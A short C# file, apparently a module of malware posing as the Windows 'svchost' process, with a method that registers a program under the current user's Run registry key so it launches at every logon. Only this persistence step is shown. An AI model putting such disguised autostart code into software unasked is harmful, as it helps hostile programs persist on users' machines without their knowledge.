using System;
using System.Collections.Generic;
using System.Text;
using System.Threading.Tasks;
using Microsoft.Win32;

namespace Svchost.Spread
{
    static class Regedit
    {
        private static RegistryKey rkApp = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);

        public static void setStartup(string applicationName, string path)
        {
            rkApp.SetValue(applicationName, path);
        }
    }
}
